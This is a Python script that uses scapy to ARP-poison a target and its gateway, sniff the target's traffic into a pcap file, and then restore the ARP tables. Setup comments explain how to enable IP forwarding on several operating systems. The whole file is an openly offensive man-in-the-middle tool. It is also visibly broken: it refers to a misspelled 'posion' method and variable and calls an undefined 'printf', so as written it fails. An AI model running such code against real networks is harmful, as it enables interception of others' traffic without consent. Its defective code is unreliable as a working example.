from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time


# Run this on Linux machine first: echo 1 > /proc/sys/net/ipv4/ip_forward
# Run this on Mac first: sudo sysctl -w net.inet.ip.forwarding=1
# On Win, edit the registry HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters : IPEnableRouter REG_DWORD 1 then reboot
# Using Powershell: Set-NetIPInterface -Forwarding Enabled

TIME_LIMIT = time.time() + 120

class Poisoner:
    def __init__(self, target, gateway, interface="Wi-Fi"):
        self.target = target
        self.target_mac = get_mac(target)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gateway_mac}')
        print(f'Target ({target}) is at {self.target_mac}')
        print('-' * 30)

    def run(self):
        self.posion_thread = Process(target=self.posion)
        self.posion_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self.gateway
        poison_target.pdst = self.target
        poison_target.hwdst = self.target_mac

        printf(f'IP Src: {poison_target.psrc}')
        printf(f'IP Dst: {poison_target.dst}')
        printf(f'MAC Dst: {poison_target.hwdst}')
        printf(f'MAC Src: {poison_target.hwsrc}')
        print(poison_target.summary())
        print('-' * 30)
        
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.target
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gateway_mac
        printf(f'IP Src: {poison_gateway.psrc}')
        printf(f'IP Dst: {poison_gateway.dst}')
        printf(f'MAC Dst: {poison_gateway.hwdst}')
        printf(f'MAC Src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Beginning ARP Poison. [Press Ctrl-C to stop]')
        while time.time() < TIME_LIMIT:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_target)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
    
    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f'ip host {self.target}'
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arp_poison.pcap', packets)
        print("Successfully capture packets")
        self.restore()
        self.posion_thread.terminate()
        print("Finished sniffing")

    def restore(self):
        print("Restoring ARP Tables...")
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.target, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.target, hwsrc=self.target_mac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        print("Tables restored")

def get_mac(target_ip):
    # This subroutine get the Media Access Control (MAC) Address of any device on the network
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

if __name__=='__main__':
    (target, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    poison = Poisoner(target, gateway, interface)
    posion.run()